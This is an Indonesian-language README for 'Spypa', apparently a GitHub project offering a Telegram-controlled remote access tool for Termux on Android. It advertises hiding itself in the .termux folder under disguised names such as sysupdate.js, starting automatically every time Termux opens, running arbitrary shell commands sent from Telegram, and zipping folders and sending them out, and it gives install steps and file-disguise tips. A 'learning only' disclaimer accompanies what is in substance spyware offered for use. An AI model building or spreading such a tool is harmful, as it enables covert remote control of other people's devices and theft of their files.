# Spypa v1.1 Beta

**Spypa** adalah proyek eksperimen buatan Berlin yang memungkinkan kendali Termux dari jarak jauh melalui Telegram Bot. Bot ini berjalan di latar belakang dan dapat dikontrol sepenuhnya dari Telegram, cocok untuk eksperimen otomatisasi dan pemantauan sistem.

> **PERINGATAN:** Ini hanya untuk keperluan pembelajaran dan eksperimen pribadi. Dilarang digunakan untuk kegiatan ilegal atau tanpa izin.

---

## Fitur

- Menyembunyikan diri di direktori `.termux` dengan nama acak (misal: `ddos.js`)
- Auto-start otomatis setiap kali Termux dibuka
- Menerima dan menjalankan perintah shell dari Telegram
- Mengirim file ZIP dari folder tertentu ke Telegram
- Perintah khusus untuk menghentikan dan menghapus bot

---
## update 
-Notifikasi IP saat online:
Bot akan otomatis mengirim pesan seperti:
IP 123.456.78.90 telah online di Spypa

## Cara Install

1. **Clone repo ini:**

```bash
https://github.com/berlin997/Spypa
cd Spypa
```

2. **Edit token dan ID di file utama (`spypa.js`):**

```js
const BOT_TOKEN = 'ISI_TOKEN_MU';
const CHAT_ID = 'ISI_ID_MU';
```

3. **Install dependensi:**

```bash
pkg update -y
pkg install nodejs git zip -y
```

4. **Jalankan bot untuk pertama kali:**

```bash
node spypa.js
```

> Setelah dijalankan, file akan tersalin ke `~/.termux/.service-cache` dan berjalan otomatis di background setiap Termux dibuka.

---

## Menyembunyikan File

Agar terlihat seperti file biasa, kamu bisa mengganti nama sebelum dijalankan:

```bash
mv spypa.js ddos.js
node ddos.js
```

Contoh nama penyamaran lainnya:
- `sysupdate.js`
- `checknet.js`
- `update-pkg.js`

---

## Perintah Telegram

- `/zip nama_folder`  
  Kompres folder dan kirim file ZIP ke Telegram.

- `/mati`  
  Menghapus file tersembunyi, hapus autostart, dan menghentikan bot.

- `<perintah shell>`  
  Jalankan perintah seperti `ls`, `pwd`, `whoami`, `uname -a`, dll.

---

## Versi

**Spypa v1.0 Beta**  
Eksperimen oleh **Berlin**  
Dirancang untuk penggunaan pribadi dan pembelajaran

---

## Lisensi

Proyek ini hanya untuk edukasi dan penggunaan pribadi.  
Dilarang digunakan untuk tindakan yang merugikan orang lain.
